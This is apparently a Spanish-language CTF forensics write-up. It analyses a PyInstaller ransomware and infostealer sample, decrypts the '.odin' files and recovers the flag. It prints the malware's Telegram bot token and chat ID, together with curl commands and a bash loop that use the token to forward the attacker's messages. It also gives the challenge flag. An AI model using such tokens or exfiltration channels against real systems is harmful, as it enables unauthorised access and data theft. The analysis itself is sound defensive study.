# Forensic / Black Myth Wukong

Tenemos un AD1 que podemos abrir con FTK Imager o una [extension de 7zip](https://www.tc4shell.com/en/7zip/forensic7z/):

Al parecer el sistema fue infectado con algún malware, en \Users\wukong\Pictures

![odin](https://github.com/user-attachments/assets/c0588d04-5757-4148-b481-68eeb0d62dd0)

En \Users\wukong\AppData\Local\Microsoft\Windows\ hay un ejecutable con el nombre del reto:

![inaryfounded](https://github.com/user-attachments/assets/0feba2c9-b5b5-4863-a1b3-e5ce5356b69e)

El binario resulta ser un ejecutable creado con PyInstaller, se nota por las cadenas que contiene

![python3](https://github.com/user-attachments/assets/240b3599-6d42-4b0b-bb9a-aa15fb28534c)

Se pueden extraer los archivos pyd con [pyinstxtractor](https://github.com/extremecoders-re/pyinstxtractor/) y luego obtener el codigo fuente en python con [pylingual](https://pylingual.io/)

![extractor](https://github.com/user-attachments/assets/f8dccd58-d020-4382-835c-676f767331ac)

![codificador](https://github.com/user-attachments/assets/595b5334-6953-4591-82c7-e71f8fc013c9)

Es un malware que encripta los archivos en varios directorios, los encripta y les añade la extensión .odin; la encriptación se hace con Fernet, XOR y AES en ese orden, el proceso inverso se puede usar para desencriptar las imagenes:

``` python3
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import unpad
from cryptography.fernet import Fernet

key_xori = 'y0u_l00k_l1k3_X1sh1_&_b3_my_l4dy'
key_fernet = [b'zTskoYGm68VrSiOM6J9W0PqyKTfSyraM0NydVmJvM_k=', b'pcD23bRQTL1MqLS84NdPsiPdYJlwbTaal6JmulzTq4k=', b'9EBQNDjmy0rGXCbVgVnrgFFsAHk4Ye1M8y1GSIx9CPY=', b'663RnK5l0MQzewfpAQfYhJbL3p7ZRoR-j7I3DkXiUIk=', b'I5Arxkgfo2E56VBVctFjJ-pFkeBbQg6QXMuG-gNgqq4=', b'eXP1sKfkTE9PNkWR8rA9jzJqun80yMYPrzMMi65JQpw=', b'56S9Sv7zUPL71w6N2OTSwxvFl_a-5zvsN6rxQI97UWU=', b'gZcRMaVftMg_F9E4tNQ_etAR7_PKT_vVfWwWkMSxDQc=', b'-XmaKL4uo4p0gM5ARQZtxjZ_5ecK1w53AEkWuiWDIzQ=', b'ikNfBtrrX-9EBI3iKzWnBJW5wNNvi8rM4oT9BLqDJNw=', b'uEikHaHAX1B20aB_bcQwUA0aO21Ai-rgYAqGfKxHKJA=', b'deoHTwNvwTOuQjoy5oh9jN_ZQlLbVCvwI47D3sQt8UA=', b'xuaD7BqwreniKZAvBO38MO250oO40HXboxhU8--6YQ0=', b'X5GfY_zukIDPKxyzmMYFkps-Av8Ao2TQDPmckrjb3ZQ=', b'CAOD7XSW4e-ON33uz5_8h6RZhorDlKg798e1RcEYSlo=', b'dMphwlwO6Qh_FCdbMzseoZsWkQWPFtGx8VSiFAN2SSo=', b'q4NfcRieLIKnyBwFEhUxZcR_8A3BFS_n_cIE8sFX8a4=', b'hLfAPR06xuo545qJlzlYko5f9KKuXOBrCBNgzruTV14=']

def unpad_data(data):
    return unpad(data, AES.block_size)

def aes_decrypt(data, key):
    key = key.encode('utf-8')
    cipher = AES.new(key, AES.MODE_ECB)
    decrypted = unpad_data(cipher.decrypt(data))
    return decrypted

def xor_decrypt(data, key):
    decrypted = bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])
    return decrypted

def decrypt_file(file_path, output_path):
    with open(file_path, 'rb') as enc_file:
        encrypted_data = enc_file.read()
    decrypted_data = aes_decrypt(encrypted_data, key_xori) # AES decryption
    decrypted_data = xor_decrypt(decrypted_data, key_fernet[0]) # XOR decryption
    for key in reversed(key_fernet): # Fernet decryption
        fernet = Fernet(key)
        decrypted_data = fernet.decrypt(decrypted_data)
    
    with open(output_path, 'wb') as dec_file:
        dec_file.write(decrypted_data)

encrypted_file_path = 'wukong.png.odin'
decrypted_file_path = 'wukong.png'
decrypt_file(encrypted_file_path, decrypted_file_path)
print("Decryption done!!")
```

Al aplicarle el cifrado a la imagen de Wukong se obtiene la primera parte de la flag:

![wukong](https://github.com/user-attachments/assets/bec233c8-1e86-4f94-8c4d-17faeef7cda6)

El malware se dirige a múltiples navegadores basados ​​en Chromium (Chrome, Opera, Brave, Edge, etc.). Roba específicamente cookies y contraseñas, luego las descifra y también recopila información detallada del sistema de la máquina de la víctima, como detalles de hardware y sistema operativo, dirección IP y geolocalización. Luego, esta información se comprime en un archivo .zip y se carga en la cuenta de Telegram del atacante mediante la API de Telegram Bot. En el codigo fuente viene el token del bot y el ID del chat del atacante:

``` python
TAPI: str = '7772912370:AAEkDG-RH1tZfNAPRN5nmKIJekvN0tRv06Q'
TCHATID: str = '-4528960795'
``` 

Con `curl -v "https://api.telegram.org/bot7772912370:AAEkDG-RH1tZfNAPRN5nmKIJekvN0tRv06Q/getMe"
` obtenemos informacion del bot, incluyendo su nombre para buscarlo por telegram:
```

{"ok":true,"result":{"id":7772912370,"is_bot":true,"first_name":"Black M\u00eat \u01afukong","username":"blackmeetwukongbot","can_join_groups":true,"can_read_all_group_messages":false,"supports_inline_queries":false,"can_connect_to_business":false,"has_main_web_app":false}}

```

![bot](https://github.com/user-attachments/assets/07cf8eb5-5ad7-42ad-ab0b-b10a726fee77)

Con `curl -v "https://api.telegram.org/bot7772912370:AAEkDG-RH1tZfNAPRN5nmKIJekvN0tRv06Q/getUpdates"` obtienes el historial de tu chat con el bot, y entre la información el ID de tu chat, en mi caso fue `1181335955`

Con esto hacemos un script para redirigir los ultimos 100 mensajes del chat del atacante con el bot a nosotros:
``` bash
for i in $(seq 1 100); do
  response=$(curl -X POST -H "Content-Type: application/json" \
    -d "{\"from_chat_id\":\"-4528960795\", \"chat_id\":\"938182349\", \"message_id\":\"$i\"}" \
    "https://api.telegram.org/bot7772912370:AAEkDG-RH1tZfNAPRN5nmKIJekvN0tRv06Q/forwardMessage")
  status=$?
  if [ $status -ne 0 ]; then
    echo "Error al reenviar el mensaje $i: $response"
  else
    echo "Mensaje $i reenviado correctamente."
  fi
  sleep 0.1 # Agrega un retraso de 0.1 segundos
done
```

En uno de los mensajes recuperados se encontraba un [repositorio de github](https://github.com/QmxhY2sgTWVIdCBXdWtvbmc/):

![githab](https://github.com/user-attachments/assets/8adefeae-9622-4bf4-bca8-1e9092e8f7bd)

El repositorio contiene el código fuente del malware y, en la parte inferior del código, hay un comentario con un texto codificado en base85. Cuando se descifra, revela la segunda parte de la bandera.

`wwf{1_D0WN104D3D_correct_814CK_MY7H_WUK0N6}`








